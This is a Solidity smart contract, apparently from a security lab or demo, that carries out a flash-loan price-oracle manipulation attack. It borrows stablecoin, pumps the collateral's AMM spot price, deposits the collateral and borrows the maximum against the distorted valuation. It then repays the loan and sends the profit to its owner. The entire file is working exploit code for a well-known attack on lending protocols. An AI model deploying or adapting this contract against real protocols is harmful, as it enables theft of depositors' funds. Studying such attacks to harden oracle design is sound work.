// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "./interfaces/IERC20.sol";
import {ISimpleAMM} from "./interfaces/ISimpleAMM.sol";
import {IFlashBorrower} from "./interfaces/IFlashBorrower.sol";
import {ILendingPool} from "./interfaces/ILendingPool.sol";
import {FlashLoanPool} from "./FlashLoanPool.sol";

/// @notice Attack receiver: flash-borrows stablecoin, pumps collateral spot price,
///         deposits the collateral, borrows against the distorted valuation, and repays.
contract OracleAttackReceiver is IFlashBorrower {
    IERC20 public immutable usdc;
    IERC20 public immutable weth;
    ISimpleAMM public immutable amm;
    ILendingPool public immutable lendingPool;
    FlashLoanPool public immutable flashPool;
    address public immutable owner;

    uint256 public borrowedAgainstCollateral;
    uint256 public collateralDeposited;
    uint256 public flashLoanRepaid;

    event AttackStarted(uint256 flashAmount);
    event CollateralBought(uint256 usdcSpent, uint256 wethReceived);
    event CollateralDeposited(uint256 amount);
    event BorrowedAgainstInflatedPrice(uint256 amount);
    event FlashLoanSettled(uint256 amount, uint256 fee);
    event ProfitSent(address indexed owner, uint256 amount);

    constructor(address usdc_, address weth_, address amm_, address lendingPool_, address flashPool_, address owner_) {
        usdc = IERC20(usdc_);
        weth = IERC20(weth_);
        amm = ISimpleAMM(amm_);
        lendingPool = ILendingPool(lendingPool_);
        flashPool = FlashLoanPool(flashPool_);
        owner = owner_;
    }

    function attack(uint256 flashAmount) external {
        emit AttackStarted(flashAmount);
        flashPool.flashLoan(address(this), flashAmount, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        require(msg.sender == address(flashPool), "ONLY_FLASH_POOL");

        usdc.approve(address(amm), amount);
        uint256 wethOut = amm.swapExactTokensForTokens(amount, 0, address(usdc), address(this));
        emit CollateralBought(amount, wethOut);

        weth.approve(address(lendingPool), wethOut);
        lendingPool.deposit(wethOut);
        collateralDeposited = wethOut;
        emit CollateralDeposited(wethOut);

        uint256 amountToBorrow = lendingPool.maxBorrow(address(this));
        lendingPool.borrow(amountToBorrow);
        borrowedAgainstCollateral = amountToBorrow;
        emit BorrowedAgainstInflatedPrice(amountToBorrow);

        uint256 owed = amount + fee;
        usdc.approve(address(flashPool), owed);
        flashLoanRepaid = owed;
        emit FlashLoanSettled(amount, fee);

        uint256 balance = usdc.balanceOf(address(this));
        uint256 profit = balance > owed ? balance - owed : 0;
        if (profit > 0) {
            usdc.transfer(owner, profit);
            emit ProfitSent(owner, profit);
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
